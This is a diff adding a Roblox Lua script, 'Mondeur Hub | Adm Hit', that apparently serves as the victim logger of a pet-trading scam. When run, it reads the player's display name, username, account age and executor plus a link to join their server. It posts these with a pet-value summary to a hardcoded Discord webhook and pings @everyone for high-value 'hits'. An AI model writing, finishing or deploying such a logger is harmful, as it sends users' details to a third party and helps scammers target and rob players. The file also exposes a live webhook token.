@@ -1,0 +1,136 @@
+--// MONDEUR HUB | ADM HIT 🦊 (FAST + FIXED)
+
+local HttpService = game:GetService("HttpService")
+
+-- ✅ FIXED WEBHOOK
+local webhook = "https://webhook.lewisakura.moe/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+
+local threshold = 500
+
+-- =========================
+-- ⚡ REQUEST DETECTION (FASTER)
+-- =========================
+local requestFunc =
+    (syn and syn.request) or
+    (http and http.request) or
+    (http_request) or
+    (request)
+
+if not requestFunc then
+    warn("No request function")
+    return
+end
+
+-- =========================
+-- 🧠 SAMPLE DATA (REPLACE LATER)
+-- =========================
+local pets = {
+    {name = "Metal Ox", value = 500},
+    {name = "Dog", value = 5},
+    {name = "Metal Ox", value = 500}
+}
+
+local playerData = {
+    displayName = game.Players.LocalPlayer.DisplayName,
+    username = game.Players.LocalPlayer.Name,
+    accountAge = game.Players.LocalPlayer.AccountAge,
+    executor = (identifyexecutor and identifyexecutor()) or "Unknown",
+    players = #game.Players:GetPlayers() .. "/" .. game.Players.MaxPlayers
+}
+
+-- =========================
+-- 📦 STACK + SORT
+-- =========================
+local map = {}
+local totalValue = 0
+
+for _, pet in ipairs(pets) do
+    if not map[pet.name] then
+        map[pet.name] = {name = pet.name, count = 0, value = pet.value}
+    end
+    map[pet.name].count += 1
+    totalValue += pet.value
+end
+
+local list = {}
+for _, v in pairs(map) do table.insert(list, v) end
+
+table.sort(list, function(a,b)
+    return a.value > b.value
+end)
+
+-- =========================
+-- 📋 FORMAT
+-- =========================
+local function formatPets(list)
+    local t = {}
+    for i, v in ipairs(list) do
+        if i > 12 then break end
+        table.insert(t, v.name .. " x" .. v.count)
+    end
+    return (#t > 0 and table.concat(t,"\n") or "No pets")
+end
+
+local petList = formatPets(list)
+
+-- =========================
+-- 🔗 JOIN BUTTON (SAFE)
+-- =========================
+local joinLink = "https://www.roblox.com/games/" ..
+    game.PlaceId .. "?gameInstanceId=" .. game.JobId
+
+-- =========================
+-- 🚨 THRESHOLD
+-- =========================
+local content = (totalValue >= threshold) and "@everyone" or ""
+
+-- =========================
+-- 📡 DATA
+-- =========================
+local data = {
+    content = content,
+    embeds = {{
+        title = "🦊 Mondeur Hub | Adm Hit",
+        description =
+            "```" ..
+            "👤 Display Name : " .. playerData.displayName .. "\n" ..
+            "🆔 Username     : " .. playerData.username .. "\n" ..
+            "📅 Account Age  : " .. playerData.accountAge .. " days\n" ..
+            "📱 Executor     : " .. playerData.executor .. "\n" ..
+            "👥 Players      : " .. playerData.players .. "\n" ..
+            "💰 Total Value  : " .. totalValue ..
+            "```",
+        fields = {
+            {
+                name = "🐶 Pets (Best → Worst)",
+                value = "```" .. petList .. "```"
+            },
+            {
+                name = "🌐 Join Server",
+                value = "[Click to Join](" .. joinLink .. ")"
+            }
+        },
+        color = 0x2F3136,
+        footer = {text = "Mondeuronbotton"}
+    }}
+}
+
+-- =========================
+-- 🚀 FAST SEND
+-- =========================
+task.spawn(function()
+    local ok, res = pcall(function()
+        return requestFunc({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+
+    if ok and res then
+        print("Status:", res.StatusCode)
+    else
+        warn("Webhook failed")
+    end
+end)
